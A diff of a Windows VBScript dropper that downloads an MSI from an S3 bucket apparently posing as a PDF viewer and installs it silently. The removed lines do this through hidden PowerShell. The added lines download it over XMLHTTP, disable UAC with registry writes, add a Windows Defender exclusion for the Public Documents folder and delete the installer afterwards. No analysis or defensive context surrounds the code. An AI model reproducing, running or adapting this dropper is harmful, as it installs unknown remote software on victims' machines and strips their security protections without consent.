@@ -1,18 +1,52 @@
 Option Explicit
 
-Dim fso, shell, tempDir, msiFile, url, exitCode
-Set fso    = CreateObject("Scripting.FileSystemObject")
-Set shell  = CreateObject("WScript.Shell")
-tempDir    = fso.GetSpecialFolder(2)          
-msiFile    = tempDir & "\agent-c92d02.msi"   
-url        = "https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"
-shell.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command " & _
-          """(New-Object Net.WebClient).DownloadFile('" & url & "', '" & msiFile & "')""", 0, True
-If fso.FileExists(msiFile) Then
-    exitCode = shell.Run("msiexec.exe /i """ & msiFile & """ /qn", 0, True)
+Dim objShell, objFSO, objHTTP, objStream
+Dim strURL, strFilePath, strInstallCmd, strPSCommand, strPublicDocs
+
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+strURL = "https://pdfviewers.s3.ap-northeast-1.amazonaws.com/file.msi"
+strFilePath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\file.msi"
+
+' --- download ---
+Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+objHTTP.Open "GET", strURL, False
+objHTTP.Send
+
+If objHTTP.Status = 200 Then
+    Set objStream = CreateObject("ADODB.Stream")
+    objStream.Open
+    objStream.Type = 1 ' binary
+    objStream.Write objHTTP.ResponseBody
+    objStream.SaveToFile strFilePath, 2 ' overwrite
+    objStream.Close
+Else
+    WScript.Echo "Download failed: HTTP " & objHTTP.Status
+    WScript.Quit 1
 End If
-WScript.Sleep 5000                        
-On Error Resume Next
-fso.DeleteFile msiFile, True
-On Error GoTo 0
-WScript.Quit exitCode
+
+' --- silent install ---
+strInstallCmd = "msiexec /i """ & strFilePath & """ /qn"
+objShell.Run strInstallCmd, 0, True
+
+' --- turn off UAC ---
+objShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
+objShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD"
+
+' --- exclude %PUBLIC%\Documents in Windows Defender ---
+strPublicDocs = objShell.ExpandEnvironmentStrings("%PUBLIC%\Documents")
+strPSCommand = "Add-MpPreference -ExclusionPath '" & strPublicDocs & "'"
+objShell.Run "powershell -NoProfile -Command """ & strPSCommand & """", 0, True
+
+' --- cleanup downloaded msi ---
+If objFSO.FileExists(strFilePath) Then
+    objFSO.DeleteFile strFilePath, True
+End If
+
+Set objStream = Nothing
+Set objHTTP = Nothing
+Set objFSO = Nothing
+Set objShell = Nothing
+
+WScript.Quit 0
